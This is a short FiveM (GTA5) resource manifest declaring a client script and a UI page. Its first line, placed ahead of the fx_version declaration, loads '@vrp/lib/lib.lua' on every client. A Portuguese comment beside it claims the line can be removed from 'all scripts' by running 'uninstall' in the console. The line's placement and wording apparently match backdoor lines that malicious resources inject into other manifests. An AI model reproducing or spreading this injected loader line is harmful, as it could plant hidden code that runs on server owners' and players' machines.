

client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"
fx_version 'bodacious'
game 'gta5'
client_script "client.lua"
files {
    "ui/*",
    "ui/images/*"
}
ui_page_preload "yes"
ui_page {
    "ui/index.html"
}              